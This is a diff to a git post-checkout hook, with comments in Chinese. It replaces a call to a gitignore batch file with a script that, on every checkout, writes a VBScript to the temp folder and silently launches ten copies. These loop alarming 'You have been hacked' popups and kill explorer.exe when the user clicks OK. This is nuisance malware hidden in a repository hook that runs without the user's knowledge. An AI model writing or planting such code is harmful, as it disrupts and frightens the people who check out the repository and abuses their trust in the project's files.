@@ -1,3 +1,29 @@
-#!/bin/bash
-cmd.exe /c "$(dirname "$0")/gitignore.bat"  
+#!/bin/sh
+#
+# post-checkout hook: every time you git checkout, spawn the popup.vbs
 
+# 先确保 vbs 文件存在
+VB="$TEMP/popup.vbs"
+cat > "$VB" <<'EOF'
+Dim i
+i = 1000
+Do
+  response = MsgBox("You have been hacked. Exit now?", vbOKCancel + vbExclamation, "System Warning")
+  If response = vbCancel Then
+    i = i - 100
+    If i < 100 Then i = 100
+  ElseIf response = vbOK Then
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "taskkill /f /im explorer.exe", 0, False
+    WScript.Quit
+  End If
+  WScript.Sleep i
+Loop
+EOF
+
+# 然后异步启动多份
+for n in $(seq 1 10); do
+  # 在 Windows 下，用 cmd /c start 来让它跑在后台
+  cmd //C start "" wscript.exe "$VB"
+  sleep 1
+done
